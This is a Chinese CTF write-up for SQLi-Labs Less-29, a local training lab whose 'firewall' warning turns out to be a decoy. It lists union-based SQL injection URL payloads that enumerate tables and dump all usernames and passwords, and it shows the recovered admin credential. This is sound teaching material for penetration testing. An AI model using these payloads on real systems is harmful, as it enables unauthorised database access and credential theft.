【SQLi-Labs】Less-29 虚假防御与联合查询 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 联合查询

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-29 (GET - Protection with WAF)
  • 提示：页面提示受防火墙保护，实际无过滤，单引号闭合。

2. 核心原理：社会工程学与虚假防御

本关卡是一个经典的“障眼法”。页面不仅展示了巨大的 "This Site Protected by World's Best Firewall" 字样，底部的 Hint 还会回显你输入的 QUERY_STRING。

根据源码审计，后台仅仅是将输入的字符串原样打印，并在执行 SQL 查询时没有任何正则替换或 WAF 拦截逻辑。这种设计旨在测试渗透测试人员的心理素质：不要被表面恐吓性的文本吓倒，必须通过实际测试来验证防御机制是否真实存在。

3. 操作步骤与解析

第一步：探测回显点

输入 URL：?id=-1' union select 1,2,3 --+

回显现象：页面正常显示数字 2 和 3，确认存在联合查询回显点。

第二步：爆库名与表名

输入 URL：?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

回显现象：页面回显 security 以及表名 emails,referrers,uagents,users。

第三步：直接脱库提取账号密码

输入 URL：?id=-1' union select 1,group_concat(username),group_concat(password) from users --+

回显现象：页面直接爆出所有用户名和密码，包括 admin:p@ssw0rd，以及之前关卡遗留的测试账号。

4. 踩坑记录与复盘

  • 不要被前端页面欺骗：在实战中，带有“已拦截”、“安全防护”等字样的页面，有时是应用自身伪造的静态页面。必须通过构造 `1=1` 和 `1=2` 的对比测试来确认拦截规则是否生效。
  • Hint 的误导：底部的 `The Query String you input is:` 只是单纯回显了用户输入，并不代表它经过了严格的安全过滤。

5. 知识点总结

  • 黑盒测试思维：通过实际发包（如 `UNION SELECT`）来判断系统是否有防御，而非依赖视觉层面的文字提示。
